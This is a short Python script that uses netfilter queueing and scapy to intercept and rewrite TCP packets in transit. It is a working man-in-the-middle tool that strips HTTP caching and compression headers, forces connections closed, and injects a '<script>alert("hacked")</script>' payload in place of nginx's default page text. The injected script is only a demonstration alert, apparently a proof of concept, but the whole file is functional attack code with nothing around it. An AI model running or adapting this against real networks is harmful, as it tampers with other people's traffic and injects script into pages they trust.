#!/usr/bin/env python3

import fnfqueue
from scapy.all import *

queue = 0
conn = fnfqueue.Connection()

try:
    q = conn.bind(queue)
    q.set_mode(0xffff, fnfqueue.COPY_PACKET)
except PermissionError:
    print("Access denied; Do I have root rights or the needed capabilities?")
    sys.exit(-1)

search_for  = b'the nginx web server is successf'
replace_for = b'<script>alert("hacked")</script>'

while True:
    try:
        for packet in conn:

            pkt = IP(packet.payload)

            if Raw not in pkt or TCP not in pkt:
                packet.accept()
                continue

            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum

            pkt[Raw].load = re.sub(r'If-Modified-Since.*\r\n'.encode(), b'', pkt[Raw].load)
            pkt[Raw].load = re.sub(r'If-None-Match.*\r\n'.encode(), b'', pkt[Raw].load)
            pkt[Raw].load = re.sub(r'Accept-Encoding.*\r\n'.encode(), b'', pkt[Raw].load)
            pkt[Raw].load = re.sub(r'Connection:.*\r\n'.encode(), b'Connection: close\r\n', pkt[Raw].load)
            pkt[Raw].load = re.sub(r'Upgrade-Insecure-Requests.*\r\n'.encode(), b'', pkt[Raw].load)
            pkt[Raw].load = re.sub(search_for, replace_for, pkt[Raw].load)

            print(pkt.summary())

            packet.payload = bytes(pkt)
            packet.mangle()

    except fnfqueue.BufferOverflowException:
        print("buffer error")
        pass

conn.close()

